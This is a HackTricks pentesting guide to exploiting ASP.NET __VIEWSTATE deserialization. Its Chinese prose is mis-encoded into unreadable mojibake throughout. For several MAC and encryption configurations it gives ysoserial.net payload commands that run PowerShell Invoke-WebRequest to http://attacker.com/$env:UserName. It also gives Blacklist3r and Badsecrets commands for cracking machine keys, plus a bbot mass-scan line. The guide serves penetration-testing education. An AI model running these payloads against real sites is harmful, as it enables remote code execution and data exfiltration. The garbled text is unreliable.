# åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹åˆ©ç”¨\_\_VIEWSTATE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœä½ å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£å¹¶ä¸”æƒ³è¦æ”»ç ´ä¸å¯æ”»ç ´çš„ç›®æ ‡â€”â€”æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼ï¼ˆéœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­èƒ½åŠ›ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

## ä»€ä¹ˆæ˜¯ViewState

**ViewState**æ˜¯ASP.NETæ¡†æ¶é»˜è®¤ä½¿ç”¨çš„æ–¹æ³•ï¼Œç”¨äºåœ¨ç½‘é¡µä¹‹é—´**ä¿ç•™é¡µé¢å’Œæ§ä»¶çš„å€¼**ã€‚å½“é¡µé¢çš„HTMLè¢«æ¸²æŸ“æ—¶ï¼Œé¡µé¢çš„å½“å‰çŠ¶æ€å’Œéœ€è¦åœ¨postbackæœŸé—´ä¿ç•™çš„å€¼è¢«åºåˆ—åŒ–ä¸ºbase64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¾“å‡ºåˆ°ViewStateéšè—å­—æ®µä¸­ã€‚\
ä»¥ä¸‹å±æ€§æˆ–å±æ€§ç»„åˆé€‚ç”¨äºViewStateä¿¡æ¯ï¼š

* Base64
* å¯ä»¥ä½¿ç”¨EnableViewStateMacå’ŒViewStateEncryptionModeå±æ€§è®¾ç½®ä¸ºfalseæ¥å®šä¹‰
* Base64 + MACï¼ˆæ¶ˆæ¯è®¤è¯ç ï¼‰å¯ç”¨
* å¯ä»¥ä½¿ç”¨EnableViewStateMacå±æ€§è®¾ç½®ä¸ºtrueæ¥å®šä¹‰
* Base64 + åŠ å¯†
* å¯ä»¥ä½¿ç”¨viewStateEncryptionModeå±æ€§è®¾ç½®ä¸ºtrueæ¥å®šä¹‰

## **æµ‹è¯•æ¡ˆä¾‹**

![](<../../.gitbook/assets/image (309) (2).png>)

### æµ‹è¯•æ¡ˆä¾‹ï¼š1 â€“ EnableViewStateMac=false and viewStateEncryptionMode=false

è¿˜å¯ä»¥é€šè¿‡åœ¨ä»¥ä¸‹ä½ç½®å°†`AspNetEnforceViewStateMac`æ³¨å†Œè¡¨é”®è®¾ç½®ä¸ºé›¶æ¥å®Œå…¨ç¦ç”¨ViewStateMACï¼š
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**è¯†åˆ«ViewStateå±æ€§**

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨BurpSuiteæ•è·åŒ…å«æ­¤å‚æ•°çš„è¯·æ±‚æ¥ç¡®å®šæ˜¯å¦ä½¿ç”¨MACä¿æŠ¤ViewStateï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

å¦‚æœæœªä½¿ç”¨Macæ¥ä¿æŠ¤è¯¥å‚æ•°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)æ¥åˆ©ç”¨å®ƒã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### æµ‹è¯•æ¡ˆä¾‹ 1.5 - ç±»ä¼¼äºæµ‹è¯•æ¡ˆä¾‹ 1ï¼Œä½†æœåŠ¡å™¨æœªå‘é€ ViewState cookie

å¼€å‘äººå‘˜å¯ä»¥é€šè¿‡å°† ViewState ä» HTTP è¯·æ±‚ä¸­ç§»é™¤ï¼ˆç”¨æˆ·å°†ä¸ä¼šæ”¶åˆ°æ­¤ cookieï¼‰æ¥é˜²æ­¢ ViewState æˆä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚\
æœ‰äººå¯èƒ½ä¼šè®¤ä¸ºï¼Œå¦‚æœ ViewState ä¸å­˜åœ¨ï¼Œä»–ä»¬çš„å®ç°å°±ä¸ä¼šå—åˆ° ViewState ååºåˆ—åŒ–å¯èƒ½å¼•å‘çš„ä»»ä½•æ½œåœ¨æ¼æ´çš„å½±å“ã€‚\
ç„¶è€Œï¼Œäº‹å®å¹¶éå¦‚æ­¤ã€‚å¦‚æœæˆ‘ä»¬å°† ViewState å‚æ•°æ·»åŠ åˆ°è¯·æ±‚ä½“ä¸­ï¼Œå¹¶å‘é€ä½¿ç”¨ ysoserial åˆ›å»ºçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥å®ç°ä»£ç æ‰§è¡Œï¼Œå°±åƒæ¡ˆä¾‹ 1 ä¸­æ‰€ç¤ºã€‚

### æµ‹è¯•æ¡ˆä¾‹ï¼š2 - .Net < 4.5 ä¸” EnableViewStateMac=true & ViewStateEncryptionMode=false

ä¸ºäº†ä¸ºç‰¹å®šé¡µé¢å¯ç”¨ ViewState MACï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç‰¹å®šçš„ aspx æ–‡ä»¶è¿›è¡Œä»¥ä¸‹æ›´æ”¹ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åœ¨**web.config**æ–‡ä»¶ä¸­è¿›è¡Œè®¾ç½®æ¥å¯¹æ•´ä¸ªåº”ç”¨ç¨‹åºè¿›è¡Œè®¾ç½®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ç”±äºè¯¥å‚æ•°å—åˆ°MACä¿æŠ¤ï¼Œä¸ºäº†æˆåŠŸæ‰§è¡Œæ”»å‡»ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å–ä½¿ç”¨çš„å¯†é’¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒBurpSuiteå°†å‘Šè¯‰æˆ‘ä»¬è¯¥å‚æ•°å—åˆ°MACä¿æŠ¤ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)æ¥æŸ¥æ‰¾ä½¿ç”¨çš„å¯†é’¥ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) æ˜¯å¦ä¸€ä¸ªå¯ä»¥è¯†åˆ«å·²çŸ¥ machineKeys çš„å·¥å…·ã€‚å®ƒæ˜¯ç”¨ Python ç¼–å†™çš„ï¼Œæ‰€ä»¥ä¸ Blacklist3r ä¸åŒï¼Œå®ƒæ²¡æœ‰ Windows ä¾èµ–ã€‚å¯¹äº .NET viewstatesï¼Œæœ‰ä¸€ä¸ªåä¸º "python blacklist3r" çš„å®ç”¨ç¨‹åºï¼Œè¿™æ˜¯ä½¿ç”¨å®ƒçš„æœ€å¿«æ–¹æ³•ã€‚

å®ƒå¯ä»¥ç›´æ¥æä¾› viewstate å’Œ generatorï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

æˆ–è€…ï¼Œå®ƒå¯ä»¥ç›´æ¥è¿æ¥åˆ°ç›®æ ‡URLï¼Œå¹¶å°è¯•ä»HTMLä¸­æå–viewstateï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

ä¸ºäº†æ‰¹é‡æœç´¢æ˜“å—æ”»å‡»çš„è§†å›¾çŠ¶æ€ï¼Œå¯ä»¥ç»“åˆå­åŸŸåæšä¸¾ä½¿ç”¨`badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md)æ¨¡å—ï¼š
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

å¦‚æœä½ å¾ˆå¹¸è¿åœ°æ‰¾åˆ°äº†å¯†é’¥ï¼Œä½ å¯ä»¥ä½¿ç”¨[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)ç»§ç»­æ”»å‡»ï¼š
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
åœ¨æœåŠ¡å™¨æ²¡æœ‰å‘é€`_VIEWSTATEGENERATOR`å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ‚¨æ— éœ€æä¾›`--generator`å‚æ•°ï¼Œä½†éœ€è¦æä¾›ä»¥ä¸‹å‚æ•°ï¼š
```bash
--apppath="/" --path="/hello.aspx"
```
### æµ‹è¯•æ¡ˆä¾‹ï¼š3 â€“ .Net < 4.5 å’Œ EnableViewStateMac=true/false ä»¥åŠ ViewStateEncryptionMode=true

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒBurpæ— æ³•è¯†åˆ«å‚æ•°æ˜¯å¦å—åˆ°MACä¿æŠ¤ï¼Œå› ä¸ºå®ƒæ— æ³•è¯†åˆ«è¿™äº›å€¼ã€‚å› æ­¤ï¼Œè¯¥å€¼å¯èƒ½å·²åŠ å¯†ï¼Œæ‚¨å°†**éœ€è¦ä½¿ç”¨Machine Keyæ¥åŠ å¯†æ‚¨çš„æœ‰æ•ˆè½½è·**ä»¥åˆ©ç”¨æ­¤æ¼æ´ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/3.0.png)

**åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**[**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **æ¨¡å—æ­£åœ¨å¼€å‘ä¸­...**

åœ¨.NET 4.5ä¹‹å‰ï¼Œå³ä½¿å°†`ViewStateEncryptionMode`è®¾ç½®ä¸º**Always**ï¼ŒASP.NETä¹Ÿå¯ä»¥**æ¥å—**ç”¨æˆ·çš„**æœªåŠ å¯†**çš„\_`__VIEWSTATE`\_å‚æ•°ã€‚ASP.NETåªæ£€æŸ¥è¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨**`__VIEWSTATEENCRYPTED`**å‚æ•°ã€‚**å¦‚æœåˆ é™¤æ­¤å‚æ•°å¹¶å‘é€æœªåŠ å¯†çš„æœ‰æ•ˆè½½è·ï¼Œå®ƒä»å°†è¢«å¤„ç†ã€‚**

å› æ­¤ï¼Œå¦‚æœå·²çŸ¥Machinekeyï¼ˆä¾‹å¦‚é€šè¿‡ç›®å½•éå†é—®é¢˜ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨**æ¡ˆä¾‹2**ä¸­ä½¿ç”¨çš„[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)å‘½ä»¤æ¥åˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´æ‰§è¡ŒRCEã€‚

* ä»è¯·æ±‚ä¸­åˆ é™¤`__VIEWSTATEENCRYPTED`å‚æ•°ä»¥åˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´ï¼Œå¦åˆ™å°†è¿”å›ViewState MACéªŒè¯é”™è¯¯ï¼Œå¹¶ä¸”åˆ©ç”¨å°†å¤±è´¥ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/3.1.png)

### æµ‹è¯•æ¡ˆä¾‹ï¼š4 â€“ .Net >= 4.5 å’Œ EnableViewStateMac=true/false ä»¥åŠ ViewStateEncryptionMode=true/falseï¼Œé™¤éä¸¤ä¸ªå±æ€§éƒ½è®¾ç½®ä¸ºfalse

æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨web.configæ–‡ä»¶ä¸­æŒ‡å®šä»¥ä¸‹å‚æ•°æ¥å¼ºåˆ¶ä½¿ç”¨ASP.NETæ¡†æ¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚
```markup
<httpRuntime targetFramework="4.5" />
```
æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡åœ¨web.configæ–‡ä»¶çš„`machineKey`å‚æ•°ä¸­æŒ‡å®šä»¥ä¸‹é€‰é¡¹æ¥å®Œæˆã€‚
```bash
compatibilityMode="Framework45"
```
ä¸ä¹‹å‰çš„æƒ…å†µä¸€æ ·ï¼ŒBurpæ— æ³•è¯†åˆ«è¯·æ±‚æ˜¯å¦å—åˆ°MACä¿æŠ¤ï¼Œå› ä¸º**å€¼æ˜¯åŠ å¯†çš„**ã€‚å› æ­¤ï¼Œä¸ºäº†å‘é€**æœ‰æ•ˆçš„æœ‰æ•ˆè´Ÿè½½ï¼Œæ”»å‡»è€…éœ€è¦å¯†é’¥**ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[**Blacklist3rï¼ˆAspDotNetWrapper.exeï¼‰**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)æ¥æŸ¥æ‰¾æ­£åœ¨ä½¿ç”¨çš„å¯†é’¥ï¼š
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
æœ‰å…³IISDirPathå’ŒTargetPagePathçš„æ›´è¯¦ç»†æè¿°ï¼Œè¯·å‚è€ƒ[è¿™é‡Œ](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

æˆ–è€…ï¼Œä½¿ç”¨[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼ˆå¸¦æœ‰ç”Ÿæˆå™¨å€¼ï¼‰ï¼š
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ä¸€æ—¦ç¡®å®šäº†æœ‰æ•ˆçš„æœºå™¨å¯†é’¥ï¼Œ**ä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ç”Ÿæˆåºåˆ—åŒ–çš„æœ‰æ•ˆè´Ÿè½½**ã€‚
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
å¦‚æœä½ æœ‰`__VIEWSTATEGENERATOR`çš„å€¼ï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨`--generator`å‚æ•°å’Œè¯¥å€¼ï¼Œå¹¶çœç•¥`--path`å’Œ`--apppath`å‚æ•°ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

å¦‚æœæˆåŠŸåˆ©ç”¨äº†ViewStateååºåˆ—åŒ–æ¼æ´ï¼Œä¸€ä¸ªå—æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨å°†æ”¶åˆ°ä¸€ä¸ªåŒ…å«ç”¨æˆ·åçš„å¸¦å¤–è¯·æ±‚ã€‚[æˆåŠŸåˆ©ç”¨çš„PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### æµ‹è¯•æ¡ˆä¾‹6 - ä½¿ç”¨äº†ViewStateUserKeys

**ViewStateUserKey**å±æ€§å¯ä»¥ç”¨æ¥é˜²å¾¡**CSRFæ”»å‡»**ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­å®šä¹‰äº†è¿™æ ·çš„å¯†é’¥ï¼Œå¹¶ä¸”æˆ‘ä»¬å°è¯•ä½¿ç”¨å‰é¢è®¨è®ºçš„æ–¹æ³•ç”Ÿæˆ**ViewState**è´Ÿè½½ï¼Œ**åº”ç”¨ç¨‹åºå°†ä¸ä¼šå¤„ç†è¯¥è´Ÿè½½**ã€‚\
ä¸ºäº†æ­£ç¡®åˆ›å»ºè´Ÿè½½ï¼Œä½ éœ€è¦ä½¿ç”¨å¦ä¸€ä¸ªå‚æ•°ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸåˆ©ç”¨çš„ç»“æœ <a href="#poc" id="poc"></a>

å¯¹äºæ‰€æœ‰çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¦‚æœ ViewState YSoSerial.Net è½½è·**æˆåŠŸ**èµ·ä½œç”¨ï¼ŒæœåŠ¡å™¨ä¼šå“åº”â€œ**500 å†…éƒ¨æœåŠ¡å™¨é”™è¯¯**â€ï¼Œå“åº”å†…å®¹ä¸ºâ€œ**æ­¤é¡µé¢çš„çŠ¶æ€ä¿¡æ¯æ— æ•ˆï¼Œå¯èƒ½å·²æŸå**â€ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¼šå¾—åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ OOB è¯·æ±‚ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

å¸¦æœ‰å½“å‰ç”¨æˆ·åçš„å¸¦å¤–è¯·æ±‚

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## å‚è€ƒèµ„æ–™

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœæ‚¨å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£å¹¶ä¸”æƒ³è¦æ”»ç ´ä¸å¯æ”»ç ´çš„ç›®æ ‡ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼**ï¼ˆéœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦é¢å’Œå£è¯­èƒ½åŠ›ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
